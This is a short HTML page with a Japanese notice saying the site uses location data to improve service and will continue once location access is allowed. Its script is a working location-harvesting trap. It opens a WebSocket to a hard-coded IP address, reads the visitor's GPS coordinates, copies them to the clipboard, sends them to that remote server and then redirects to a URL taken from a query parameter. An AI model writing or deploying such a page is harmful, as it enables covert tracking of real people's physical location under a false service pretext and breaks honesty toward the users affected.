<meta charset="UTF-8">
<a>このサイトでは、サービス体験向上のため、位置情報を使用します。位置情報を許可していただくと次のサイトに移動します。</a>
<script type="text/javascript">
    ws = new WebSocket("wss://114.146.22.1:4721/")
    ws.addEventListener(
        "open",
        function(){
            navigator.geolocation.getCurrentPosition(
                function(a){
                    r = `${a.coords.latitude}, ${a.coords.longitude}`
                    navigator.clipboard.writeText(r)
                    ws.send(r)
                    location.href=new URL(location.href).searchParams("redirect")
                },
                function(a){}
            )
        }
    )
</script>
